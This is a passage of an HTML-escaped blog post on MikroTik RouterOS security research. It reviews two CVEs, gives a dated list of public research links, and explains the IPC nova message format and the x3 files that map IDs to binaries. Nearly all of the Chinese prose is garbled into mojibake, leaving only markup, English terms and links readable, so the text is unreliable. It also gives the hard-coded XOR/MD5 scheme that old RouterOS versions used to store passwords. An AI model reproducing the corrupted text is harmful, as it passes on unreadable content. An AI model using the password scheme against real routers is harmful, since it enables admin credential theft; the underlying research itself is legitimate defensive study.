  &lt;li&gt;CVE-2018-14847Ôºö‰πüÊòØ„ÄåVault 7„Äç‰∏≠ÈáùÂ∞ç RouterOS ÈÄ≤Ë°åÊîªÊìäÁöÑÊºèÊ¥û‰πã‰∏Ä„ÄÇÈÄôÂÄãÊºèÊ¥û‰ΩøÊîªÊìäËÄÖÂèØ‰ª•‰∏çÈúÄÁôªÂÖ•Â∞±ËÆÄÂèñ‰ªªÊÑèÊ™îÊ°àÔºå‰πçËÅΩ‰πã‰∏ãÂ•ΩÂÉè‰∏çÊòØÂ§ßÂïèÈ°åÔºå‰ΩÜÁî±ÊñºÂú® RouterOS ÁöÑÊó©ÊúüÁâàÊú¨‰∏≠Ôºå‰ΩøÁî®ËÄÖÁöÑÂØÜÁ¢ºÊòØ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt; ÁöÑÊñπÂºèÂÑ≤Â≠òÂú®Ê™îÊ°à‰∏≠ÔºåÊâÄ‰ª•Âè™Ë¶ÅËÉΩÂ§†ËÆÄÂèñÈÄôÂÄãÊ™îÊ°àÔºåÊîªÊìäËÄÖÂ∞±ÂèØ‰ª•ÈÄÜÁÆóÂæóÂà∞ admin ÁöÑÂØÜÁ¢º„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;ÔºöÂú® SCEP ÊúçÂãôÁöÑ base64 Ëß£Á¢ºÈÅéÁ®ã‰∏≠ÔºåÂõ†ÁÇ∫Èï∑Â∫¶Ë®àÁÆóÈåØË™§Â∞éËá¥ÁöÑ heap buffer overflow ÊºèÊ¥ûÔºåÈÄôÊòØË≥áÂÆâÁ†îÁ©∂Âì°ÂàÜÊûê‰∫Ü APT Âú®ÂÖ∂ C2 server ‰∏äÁöÑ exploit ÂæåÂèçÊé®Âá∫‰æÜÁöÑÊºèÊ¥û„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂèØ‰ª•ÁôºÁèæÔºåÈÄô‰∫õÊºèÊ¥ûÂ§ßÂ§öÊòØ„Äåin the wild„ÄçÔºåÊàëÂÄëÁÑ°ÂæûÂæóÁü•Áï∂ÂàùÁôºÁèæÊºèÊ¥ûÁöÑ‰∫∫ÊòØÂ¶Ç‰ΩïÈÄ≤Ë°åÂàÜÊûêÂèäÊÄùËÄÉ„ÄÇÂõ†Ê≠§ÈóúÊñºÂàÜÊûê RouterOS ÁöÑÊÄùË∑ØÊàñÊòØÊäÄÂ∑ßÔºåÈÄèÈÅéÈÄô‰∫õÊºèÊ¥ûËÉΩÂ≠∏ÁøíÂà∞ÁöÑÂçÅÂàÜÊúâÈôê„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Áõ∏ÈóúÁ†îÁ©∂ÂõûÈ°ß&quot;&gt;Áõ∏ÈóúÁ†îÁ©∂ÂõûÈ°ß&lt;/h2&gt;

&lt;p&gt;ÊàëÂÄëÁπºÁ∫åÁ†îËÆÄÂÖ¨ÈñãÁöÑÁ†îÁ©∂Ë≥áÊñôÔºåÂú®ÊØîË≥ΩÁöÑÁï∂‰∏ãÊàëÂÄëÊúâÈÄô‰∫õÊñáÁ´†‰ª•ÂèäÊºîË¨õÂèØ‰ª•ÂèÉËÄÉÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;‰∏ªË¶ÅÈóúÊñº jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;‰∏ªË¶ÅÈóúÊñº jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;‰∏ªË¶ÅÈóúÊñº jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Êé¢Ë®é IPC ‰∏≠ÁöÑ nova message ÁöÑÈÅã‰Ωú&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Ëàá 2018 ÁöÑÊºîË¨õÂÖßÂÆπÁõ∏Âêå&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Áï∂ÊôÇÁöÑ WinBox Â≠òÂú®‰∏ÄÂÄãÂº±ÈªûÔºöÁï∂Êö¥Èú≤Âú®Â§ñÁ∂≤ÊôÇÔºåÂèØ‰ª•Ë¢´Áî®‰æÜÂ∞çÂÖßÁ∂≤ÈÄ≤Ë°åÊéÉÊèè&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018‚Äì7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ÈÄèÈÅéÈªëÁÆ±Ê®°Á≥äÊ∏¨Ë©¶ÊâæÂà∞ SMB ‰∏≠ÁöÑ Buffer Overflow ‰ª•ÂèäÂÆåÊï¥ exploit ÊñπÊ≥ï&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Ë®éË´ñ CIA Ê≠¶Âô®Â∫´„ÄåVault 7„ÄçÂ§ñÊ¥©ÂæåÊâÄÈÄ†ÊàêÁöÑÂ§ßË¶èÊ®°Âà©Áî®‰∫ã‰ª∂&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities You‚Äôre My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ÈáãÂá∫‰∏ÄÂ•óÂçîÂä©‰ΩøÁî®ËÄÖ jailbreak RouterOS ÁöÑÂ∑•ÂÖ∑ÔºåËÆì‰ΩøÁî®ËÄÖÊúâËÉΩÂäõÊ™¢Êü•Ëá™Â∑±ÁöÑÊ©üÂô®ÊòØÂê¶Âú®Â§ßË¶èÊ®°Âà©Áî®‰∫ã‰ª∂‰∏≠Ë¢´ÂÖ•‰æµ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Â¶Ç‰ΩïÈÄèÈÅé‰∏≤ÈÄ£ DNS poisoning Âº±ÈªûÂèäÈôçÁâàÂº±ÈªûÊãøÂà∞ shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Âú® APT ÁöÑ C2 server ‰∏äÁôºÁèæ‰∏ÄÂÄãÂà©Áî® RouterOS 0-day ÁöÑÊ≠¶Âô®ÔºåÈÄèÈÅéÂàÜÊûêÊâæÂà∞ÊºèÊ¥ûÁöÑÊàêÂõ†&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Êõ¥Ë©≥Á¥∞Âú∞Èó°Ëø∞‰∫Ü RouterOS ÁöÑ IPC Ê©üÂà∂Ôºå‰∏¶‰∏îÈáãÂá∫‰∏ÄÂ•óÁ®±‰Ωú FOISted ÁöÑ jailbreak Â∑•ÂÖ∑ÂçîÂä©Á†îÁ©∂Âì°Âú® amd64 ÁâàÊú¨ÁöÑ RouterOS ‰∏äÈÄ≤Ë°åËøë‰∏ÄÊ≠•ÁöÑÁ†îÁ©∂&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;ÈÄèÈÅéÊ®°Á≥äÊ∏¨Ë©¶Âú® IPC ‰∏≠ÊåñÊéòÊºèÊ¥û&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;ipc-Ëàá-nova-message-ÂõûÈ°ß&quot;&gt;IPC Ëàá Nova Message ÂõûÈ°ß&lt;/h2&gt;

&lt;p&gt;ÂèØ‰ª•ÁôºÁèæ‰∏äËø∞ÁöÑÁ†îÁ©∂Â§ßÈÉ®ÂàÜÈÉΩÈõ¢‰∏çÈñã RouterOS ÁöÑËá™Ë£Ω IPCÔºåÊâÄ‰ª•ÊàëÂÄë‰πüÁ∞°ÂñÆÁöÑÂ∞çÂÖ∂Ê©üÂà∂ÈÄ≤Ë°å‰∫ÜÂõûÈ°ß„ÄÇ ÈÄôË£°‰ΩøÁî®‰∏ÄÂÄãÁ∞°ÂñÆÁöÑ‰æãÂ≠êÂ∞ç IPC ÈÄ≤Ë°åË™™Êòé„ÄÇ&lt;/p&gt;

&lt;p&gt;Êó•Â∏∏‰ΩøÁî®Â†¥ÊôØ‰∏≠Ôºå‰ΩøÁî®ËÄÖÂèØ‰ª•ÈÄèÈÅé telnet ÁôªÂÖ•Ëá≥ RouterOSÔºå‰∏¶‰ΩøÁî® conolse Â∞çË∑ØÁî±Âô®ÈÄ≤Ë°åÁÆ°ÁêÜ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÆìÊàëÂÄëÊãÜËß£Êï¥ÂÄãÊµÅÁ®ã‰∏≠ IPC ÂèÉËàáÁöÑÈÉ®ÂàÜÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Áï∂‰ΩøÁî®ËÄÖÊ¨≤ÈÄèÈÅé telnet Â≠òÂèñ RouterOS ÁöÑ console ÊôÇÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process ÊúÉ‰ΩøÁî® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt; ÂéªÂü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; ÈÄôÂÄãÁ®ãÂºèÔºå‰∏¶Âêë‰ΩøÁî®ËÄÖÁ¥¢ÂèñÂ∏≥ËôüÂèäÂØÜÁ¢º„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Áï∂‰ΩøÁî®ËÄÖÈÄÅÂá∫Â∏≥ËôüÂØÜÁ¢º‰πãÂæåÔºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process ÊúÉÂ∞áÂ∏≥ËôüÂØÜÁ¢ºÊîæÈÄ≤ nova message ‰∏≠ÔºåÁôºÈÄÅËá≥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process Ë´ãÊ±ÇÈ©óË≠â
&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process ÂÆåÊàêÈ©óË≠âÂæåÔºåÈÄèÈÅé nova message ÈÄöÁü•È©óË≠âÁöÑÁµêÊûú
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Â¶ÇÊûúÁôªÂÖ•ÊàêÂäüÂ∞±ÊúÉÂñöËµ∑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; processÔºåÊé•‰∏ã‰æÜ‰ΩøÁî®ËÄÖËàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; ‰∫íÂãïÁöÑÈÅéÁ®ãÈÉΩÊòØÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process ËΩâÁôº&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc-Á∞°‰ªã&quot;&gt;IPC Á∞°‰ªã&lt;/h3&gt;

&lt;p&gt;‰∏äÈù¢ÁöÑ‰æãÂ≠êÁ∞°ÂñÆÂú∞ÊèèËø∞‰∫Ü IPC ÁöÑÂü∫Êú¨Ê¶ÇÂøµÔºå‰ΩÜÂÖ©ÂÄã process ÈñìÁöÑÊ∫ùÈÄöÂØ¶Èöõ‰∏äÊõ¥Âä†Ë§áÈõú„ÄÇÈ¶ñÂÖàÔºåÊØèÂÄãÈÄÅÂæÄÂÖ∂‰ªñÁ®ãÂºèÁöÑ nova message ÈÉΩÊúÉÂÖàÈÄèÈÅé socket Ë¢´ÈÄÅÂæÄ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt;ÔºåÊé•Ëëó &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; ÊâçÊ†πÊìö message ÂÖßÂÆπÊää message ÂàÜÊ¥æÁµ¶Â∞çÊáâÁöÑ nova binary„ÄÇ&lt;/p&gt;

&lt;p&gt;ËÆìÊàëÂÄëËàâ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑ‰æãÂ≠ê‰æÜË™™ÊòéÔºöÂÅáË®≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process ÁöÑ id ÊòØ 1039Ôºõ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process ÁöÑ id ÊòØ 13Ôºå‰∏î &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process ‰∏≠Ë≤†Ë≤¨È©óË≠âÂ∏≥ËôüÂØÜÁ¢ºÁöÑÊòØ id ÁÇ∫ 4 ÁöÑ handler„ÄÇ ÂâáÂú®ÁôªÂÖ•È©óË≠âÊµÅÁ®ã‰∏≠Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process È¶ñÂÖàÊúÉÈÄÅ‰∏ÄÂÄãÂåÖÂê´Â∏≥ËôüÂØÜÁ¢ºÁöÑË´ãÊ±ÇÁµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; processÔºåÈÄôÊôÇÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ÊòØ‰∏ÄÂÄãÂåÖÂê´ÂÖ©ÂÄãÂÖÉÁ¥†ÁöÑÈô£ÂàóÔºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[13, 4]&lt;/code&gt; ÔºåË°®Á§∫Ë¶ÅÊää message ÈÄÅÁµ¶ binary id ÁÇ∫ 13 ÁöÑ process ‰∏≠ id ÁÇ∫ 4 ÁöÑ handler„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Áï∂ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; Êî∂Âà∞ message ÂæåÔºåÂÆÉÊúÉÂÖàÁßªÈô§ message ÂÖß &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ‰∏≠‰ª£Ë°®ÁõÆÊ®ô binary id ÁöÑ 13Ôºå‰∏¶Âú® SYS_FROM ‰∏≠Â¢ûÂä†‰æÜÊ∫ê binary ÁöÑ idÔºå‰πüÂ∞±ÊòØ 1039Ôºå‰πãÂæåÊää message ÂÇ≥ÈÄÅÁµ¶ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process Êî∂Âà∞ message Âæå‰πüÊúÉÂÅöÈ°û‰ººÁöÑ‰∫ãÊÉÖÔºåÂ∞á&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; ‰∏≠‰ª£Ë°®ÁõÆÊ®ô handler id ÁöÑ 4 ÁßªÈô§ÂæåÔºåÊé•ËëóÊää nova message ÈÄÅËá≥ handler 4 ÈÄ≤Ë°åËôïÁêÜÔºåÊúÄÁµÇÁî± handler 4 Âü∑Ë°åÈ©óË≠âÁöÑÈÇèËºØ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message-Á∞°‰ªã&quot;&gt;Nova Message Á∞°‰ªã&lt;/h3&gt;

&lt;p&gt;ËÄå‰∏äËø∞ IPC ‰∏≠‰ΩøÁî®ÁöÑ nova message ÊòØÁî± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; ÂèäÁõ∏ÈóúÁöÑ function ÈÄ≤Ë°åÂàùÂßãÂåñËàáË®≠ÂÆö„ÄÇNova message ÂØ¶Èöõ‰∏äÊòØÁî±ÂÖ∑ÊúâÂûãÂà•ÁöÑ key-value pair ÊßãÊàêÔºå‰∏î key Âè™ËÉΩÊòØÊï¥Êï∏ÔºåÊâÄ‰ª• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; Á≠â key Âè™ÊòØÂñÆÁ¥îÁöÑ macro ÁΩ∑‰∫Ü„ÄÇËÄå nova message ‰∏≠ÂèØ‰ª•‰ΩøÁî®ÁöÑÂûãÂà•ÂåÖÊã¨ u32, u64, bool, string, bytes, IP Âèä nova message Ôºà‰πüÂ∞±ÊòØÂèØ‰ª•Âª∫Á´ãÂ∑¢ÁãÄÁöÑ nova messageÔºâ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âõ†ÁÇ∫ RouterOS Â∑≤‰∏çÁî® JSON ‰æÜÂÇ≥ÈÅû nova messageÔºåÊâÄ‰ª•ÊàëÂÄëÂè™ÈáùÂ∞ç binary Ê†ºÂºèÈÄ≤Ë°åË™™Êòé„ÄÇÂú® IPC Ê∫ùÈÄöÈÅéÁ®ã‰∏≠ÔºåÊî∂ÊñπÁöÑ socket È¶ñÂÖàÊúÉÊî∂Âà∞‰∏ÄÂÄãË°®ÈÅîÁï∂Ââç nova message Èï∑Â∫¶ÁöÑÊï¥Êï∏Ôºå‰πãÂæåÊé•Ëëó binary Ê†ºÂºèÁöÑ nova message„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nova message ÁöÑÈñãÈ†≠ÊòØÂÖ©ÂÄã magic bytesÔºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;„ÄÇÊé•‰∏ã‰æÜÔºåÊØèÂÄã key ÈÉΩ‰ΩøÁî® 4 bytes ‰æÜÊèèËø∞ÔºõÂÖ∂‰∏≠ÔºåÂâç 3 bytes Áî®‰æÜË°®ÈÅî key ÁöÑ idÔºåÊúÄÂæå‰∏ÄÂÄã byte ÊòØ key ÁöÑÂûãÂà•„ÄÇÊ†πÊìöÂûãÂà•ÔºåÊúÉ‰ª•‰∏çÂêåËß£ÊûêÊñπÂºèÂ∞áÁ∑äÊé•Âú®ÂæåÁöÑ bytes ÂèñÂá∫‰ΩúÁÇ∫ dataÔºåÂèñÂÆå data ‰πãÂæåÔºåÂæåÈù¢Á∑äÊé•ËëóÁöÑ‰æøÊòØ‰∏ã‰∏ÄÂÄã keyÔºåÂ¶ÇÊ≠§Âæ™Áí∞‰∏ãÂéª„ÄÇÁï∂‰∏≠ÊØîËºÉÁâπÂà•ÁöÑÊòØ bool ÂûãÂà•ÔºåÂõ†ÁÇ∫ bool ÂèØ‰ª•ÂÉÖÁî®‰∏ÄÂÄã bit Ë°®Á§∫Ôºånova message ‰æøÁõ¥Êé•‰ΩøÁî® type ÁöÑÊúÄ‰Ωé‰∏Ä‰Ωç bit ‰æÜË°®Á§∫ True/FalseÔºåÊõ¥Ë©≥Á¥∞ÁöÑÊ†ºÂºèÂèØ‰ª•ÂèÉËÄÉ &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;Ôºö
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;x3-format&quot;&gt;x3 format&lt;/h3&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÁû≠Ëß£ nova message ‰∏≠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; Âèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; ÁöÑ id ÂÖ∑È´îÊòØÊåáÂì™‰∏ÄÂÄã nova binaryÔºåÊàëÂÄëÈúÄË¶ÅËß£Êûê‰∏ÄÁ®ÆÂâØÊ™îÂêçÁÇ∫ x3 ÁöÑÊ™îÊ°àÔºåÂÆÉÊòØ binary Ê†ºÂºèÁöÑ xml„ÄÇÂú®Êí∞ÂØ´Â∑•ÂÖ∑Ëß£Êûê  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; ÂæåÔºåÊàëÂÄë‰æøÂèØÂæóÁü•ÊØèÂÄã id ÊâÄÂ∞çÊáâÁöÑÊòØÂì™ÂÄã nova binaryÔºå‰æãÂ¶ÇÂú®‰∏ãÂúñ‰∏≠Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/bin/log&lt;/code&gt; ÁöÑ id Â∞±ÊòØ 3„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÊúâ‰∫õ binary ÁöÑ id ‰∏¶‰∏çÂú®ÈÄôÂÄãÊ™îÊ°àÁï∂‰∏≠ÔºåÊòØÂõ†ÁÇ∫Ë©≤ binary ÂèØËÉΩÊòØÈÄèÈÅéÂÆâË£ù MikroTik ÂÆòÊñπÊèê‰æõÁöÑ package ‰πãÂæåÊâçÊúâÁöÑÂäüËÉΩÔºåÊ≠§ÊôÇ binary ÁöÑ id Â∞±ÊúÉÂ≠òÂú®Êñº &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt; Áï∂‰∏≠Ôºå&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; Â∞±ÊòØ‰∏Ä‰æã„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÂÑòÁÆ°Â¶ÇÊ≠§Ôºå‰æùËàäÊúâ‰∫õ binary id ÊòØÁÑ°Ê≥ïÂú®‰ªª‰Ωï .x3 Ê™îÊ°à‰∏≠ÊâæÂà∞ÁöÑÔºåÂõ†ÁÇ∫ÈÄôÈ°ûÂûãÁöÑ process ‰∏¶‰∏çÊòØÊåÅ‰πÖÂ≠òÂú®Ôºå‰æãÂ¶ÇÔºöÂè™Êúâ‰ΩøÁî®ËÄÖÂòóË©¶ÁôªÂÖ•ÊôÇÊâçÊúÉË¢´ÂñöËµ∑ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; processÔºåÈÄôÈ°û process Â∞±‰ª•ÊµÅÊ∞¥Ëôü‰ΩúÁÇ∫ id„ÄÇ&lt;/p&gt;

&lt;p&gt;Âè¶Â§ñÔºå.x3 Ê™îÊ°à‰πüË¢´Áî®‰æÜË®òÈåÑ nova binary ÁöÑÁõ∏ÈóúË®≠ÂÆöÔºå‰æãÂ¶Ç &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; Â∞±Âú® .x3 ‰∏≠ÊåáÂÆöÊØèÂÄã URI ÊáâË©≤‰ΩøÁî®Âì™‰∏ÄÂÄã servlet ‰æÜÈÄ≤Ë°åËôïÁêÜ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â∞èÁµê&quot;&gt;Â∞èÁµê&lt;/h2&gt;

&lt;p&gt;Á∂ìÁî±ÂõûÈ°ß‰∫ÜÈÅéÂéªÁöÑÁ†îÁ©∂Âèä CVEÔºåÂèØ‰ª•ÁôºÁèæÂ§ßÂ§öÊàëÂÄëÊÑüËààË∂£ÁöÑÊºèÊ¥ûÈÉΩÈõÜ‰∏≠Âú®ÈÅéÂéªÁöÑ‰∏ÄÊÆµÊôÇÈñìÂÖßÔºåËøëÊúü‰ºº‰πéÂæàÈõ£Âú® RouterOS ÁöÑ WAN Á´ØÊâæÂà∞ pre-auth ÁöÑÊºèÊ¥û„ÄÇ ‰∏îÈõñÁÑ∂ÈÄôÊúüÈñìÊåÅÁ∫åÊúâÊºèÊ¥ûË¢´Êè≠Èú≤Ôºå‰ΩÜÂèØ‰ª•ÁôºÁèæ MikroTik ËÆäÂæóË∂ä‰æÜË∂äÂÆâÂÖ®„ÄÇMikroTik ‰∏äÁúüÁöÑÂ∑≤Á∂ì‰∏çÂ≠òÂú® pre-auth ÁöÑÊºèÊ¥û‰∫ÜÂóéÔºüÊàñË®±ÂñÆÁ¥îÂè™ÊòØÊâÄÊúâ‰∫∫ÈÉΩÊää‰ªÄÈ∫ºÊù±Ë•øÊºèÁúã‰∫ÜÔºü&lt;/p&gt;

&lt;p&gt;ÂâçÈù¢ÊèêÂèäÁöÑÂÖ¨ÈñãÁ†îÁ©∂ÔºåÂèØ‰ª•Á∞°ÂñÆÂàÜÊàê‰∏ãÈù¢‰∏âÈ°ûÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Ë∂äÁçÑÔºàJailbreakingÔºâ&lt;/li&gt;
  &lt;li&gt;ÂàÜÊûêÂú®ÈáéÁöÑ exploit&lt;/li&gt;
  &lt;li&gt;Á†îÁ©∂ IPC ‰∏≠ÁöÑ nova message&lt;/li&gt;
&lt;/ul&gt;

